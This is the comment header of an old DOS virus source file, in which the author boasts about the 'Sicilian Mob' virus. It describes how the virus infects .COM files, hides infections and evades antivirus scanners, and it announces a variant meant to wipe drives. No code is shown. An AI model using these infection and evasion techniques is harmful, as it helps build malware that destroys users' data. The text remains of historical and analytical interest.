; Virus NOTES: It's here `Sicilian Mob Ia' Virus. And UNDETECTABLE as of the
; 	Sept & Oct 1991. This Virus wuz an development from the Vienna Virus.
;	Though is VERY different, this one had to be changed a HOLE fucken
; 	lot to make it UnDectable from McAfee & Ass (Scan 7.2V80). And I made
;	this one a Signature Virus. Passing the word that NUKE rules...

; VIRUS: Well this Virus InFects Only *.COM and the COMMAND.COM. One thing
;        about the Infection method is that there is a Random Generator in
;        the Virus and 6 out of 7 times it will infect a *.COM and 1 out of
;        7 times it will do a Warm Re-Boot. (No Memory Count) And when it
;	 Infects a file it will NOT change the Date and Time of the File!
;        This Virus is Also Able to Infect READ ONLY, files, it will change
;        the file to Read/Write and infect it, and then turn it back to READ
;        ONLY. The only sign of detection is that the infected files grow
;        by 1024 Bytes. This Virus is not Ram-Resident, and when firsted
;        runned it will try to infect MORE than ONE *.COM file. It does
;        at the Current Directory searching for *.COMs and then Uses the
;        PATH to get MORE *.COM files. If there is NO PATH the virus
;        will go to the ROOT Directory and search for Sub-Directories
;        And Once in a PATH it Checks for SUB-directories to INFECT
;        EVEN MORE *.COM. And AFTER January 1st, 1992 it will display a
;        Message that is HARD-CODED in the virus! The message will be
;        DISPLAYED EVERYTIME a Infected Program is Runned! And still continue
;        to infect *.COM after Jan 1st 1992 but you'll see the message being
;        displayed everytime!

;                       Look for Sicilian Mob II
; Yupe I have another Virus. Sicilian Mob II However this Virus will be
; Completed by Oct 1991 it won't be as NICE as this one is.
; HIGHLIGHTS of Sicilian Mob II : This Virus will Infect *.COM and *.EXE Files
; and will [NUKE] all drives from A-Z. On a certain dated. Infected files
; still keep the same date and is bigger by 1200Bytes. Basically the virus
; is like the First one. Just harder to detect from Scan (7.2V80 or latest)
; and will do a Low-Level Format on a certain Date.
